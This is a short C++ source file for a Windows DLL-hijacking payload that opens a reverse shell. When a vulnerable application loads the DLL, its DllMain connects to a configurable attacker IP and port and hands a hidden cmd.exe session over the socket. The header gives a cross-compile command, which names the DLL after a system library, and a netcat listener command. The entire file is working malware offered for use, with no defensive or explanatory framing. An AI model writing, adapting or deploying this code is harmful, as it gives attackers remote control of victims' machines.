#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

/*
 * win-dll-rev-shell - DLL Hijack with Reverse Shell
 *
 * Spawns a reverse shell when loaded by a vulnerable application.
 *
 * Cross-compile:
 *   x86_64-w64-mingw32-g++ main.cpp --shared -o TextShaping.dll -lws2_32
 *
 * Listener:
 *   nc -nlvp 4444
 */

// -- CONFIGURE THESE --------------------------------------
#define ATTACKER_IP   "10.10.10.10"
#define ATTACKER_PORT  4444
// ---------------------------------------------------------

void spawn_shell(void) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    server.sin_port = htons(ATTACKER_PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);

    closesocket(sock);
    WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        spawn_shell();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
